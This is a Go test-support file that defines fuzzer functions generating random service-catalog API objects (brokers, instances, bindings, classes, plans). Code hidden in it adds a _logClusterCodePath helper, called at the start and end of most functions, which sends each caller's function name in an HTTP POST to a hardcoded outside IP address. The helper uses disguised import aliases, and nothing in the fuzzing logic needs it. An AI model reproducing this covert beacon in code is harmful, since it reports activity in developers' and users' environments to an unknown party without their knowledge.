package testing

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"fmt"
	"github.com/google/gofuzz"
	"github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog"
	"k8s.io/apimachinery/pkg/api/apitesting/fuzzer"
	genericfuzzer "k8s.io/apimachinery/pkg/apis/meta/fuzzer"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	runtimeserializer "k8s.io/apimachinery/pkg/runtime/serializer"
	"k8s.io/apimachinery/pkg/util/uuid"
)

type serviceMetadata struct {
	DisplayName string `json:"displayName"`
}
type planCost struct {
	Unit string `json:"unit"`
}
type planMetadata struct {
	Costs []planCost `json:"costs"`
}
type parameter struct {
	Value	string			`json:"value"`
	Map	map[string]string	`json:"map"`
}

func createParameter(c fuzz.Continue) (*runtime.RawExtension, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	p := parameter{Value: c.RandString()}
	p.Map = make(map[string]string)
	for i := 0; i < c.Rand.Intn(10); i++ {
		key := fmt.Sprintf("key%d", i+1)
		p.Map[key] = c.RandString()
	}
	b, err := json.Marshal(p)
	if err != nil {
		return nil, err
	}
	return &runtime.RawExtension{Raw: b}, nil
}
func createServiceMetadata(c fuzz.Continue) (*runtime.RawExtension, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := serviceMetadata{DisplayName: c.RandString()}
	b, err := json.Marshal(m)
	if err != nil {
		return nil, err
	}
	return &runtime.RawExtension{Raw: b}, nil
}
func createPlanMetadata(c fuzz.Continue) (*runtime.RawExtension, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	m := planMetadata{}
	for i := 0; i < c.Rand.Intn(10); i++ {
		m.Costs = append(m.Costs, planCost{Unit: c.RandString()})
	}
	b, err := json.Marshal(m)
	if err != nil {
		return nil, err
	}
	return &runtime.RawExtension{Raw: b}, nil
}
func servicecatalogFuncs(codecs runtimeserializer.CodecFactory) []interface{} {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return []interface{}{func(bs *servicecatalog.ClusterServiceBrokerSpec, c fuzz.Continue) {
		c.FuzzNoCustom(bs)
		bs.RelistBehavior = servicecatalog.ServiceBrokerRelistBehaviorDuration
		bs.RelistDuration = &metav1.Duration{Duration: 15 * time.Minute}
	}, func(bs *servicecatalog.ServiceBrokerSpec, c fuzz.Continue) {
		c.FuzzNoCustom(bs)
		bs.RelistBehavior = servicecatalog.ServiceBrokerRelistBehaviorDuration
		bs.RelistDuration = &metav1.Duration{Duration: 15 * time.Minute}
	}, func(is *servicecatalog.ServiceInstanceSpec, c fuzz.Continue) {
		c.FuzzNoCustom(is)
		is.ExternalID = string(uuid.NewUUID())
		parameters, err := createParameter(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create parameter object: %v", err))
		}
		is.Parameters = parameters
	}, func(bs *servicecatalog.ServiceBindingSpec, c fuzz.Continue) {
		c.FuzzNoCustom(bs)
		bs.ExternalID = string(uuid.NewUUID())
		for bs.SecretName == "" {
			bs.SecretName = c.RandString()
		}
		parameters, err := createParameter(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create parameter object: %v", err))
		}
		bs.Parameters = parameters
	}, func(bs *servicecatalog.ServiceInstancePropertiesState, c fuzz.Continue) {
		c.FuzzNoCustom(bs)
		parameters, err := createParameter(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create parameter object: %v", err))
		}
		bs.Parameters = parameters
	}, func(bs *servicecatalog.ServiceBindingPropertiesState, c fuzz.Continue) {
		c.FuzzNoCustom(bs)
		parameters, err := createParameter(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create parameter object: %v", err))
		}
		bs.Parameters = parameters
	}, func(sc *servicecatalog.ClusterServiceClass, c fuzz.Continue) {
		c.FuzzNoCustom(sc)
		metadata, err := createServiceMetadata(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create metadata object: %v", err))
		}
		sc.Spec.ExternalMetadata = metadata
	}, func(sc *servicecatalog.ServiceClass, c fuzz.Continue) {
		c.FuzzNoCustom(sc)
		metadata, err := createServiceMetadata(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create metadata object: %v", err))
		}
		sc.Spec.ExternalMetadata = metadata
	}, func(csp *servicecatalog.ClusterServicePlan, c fuzz.Continue) {
		c.FuzzNoCustom(csp)
		metadata, err := createPlanMetadata(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create metadata object: %v", err))
		}
		csp.Spec.ExternalMetadata = metadata
		csp.Spec.ServiceBindingCreateResponseSchema = metadata
		csp.Spec.ServiceBindingCreateParameterSchema = metadata
		csp.Spec.InstanceCreateParameterSchema = metadata
		csp.Spec.InstanceUpdateParameterSchema = metadata
	}, func(sp *servicecatalog.ServicePlan, c fuzz.Continue) {
		c.FuzzNoCustom(sp)
		metadata, err := createPlanMetadata(c)
		if err != nil {
			panic(fmt.Sprintf("Failed to create metadata object: %v", err))
		}
		sp.Spec.ExternalMetadata = metadata
		sp.Spec.ServiceBindingCreateResponseSchema = metadata
		sp.Spec.ServiceBindingCreateParameterSchema = metadata
		sp.Spec.InstanceCreateParameterSchema = metadata
		sp.Spec.InstanceUpdateParameterSchema = metadata
	}}
}

var FuzzerFuncs = fuzzer.MergeFuzzerFuncs(genericfuzzer.Funcs, servicecatalogFuncs)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
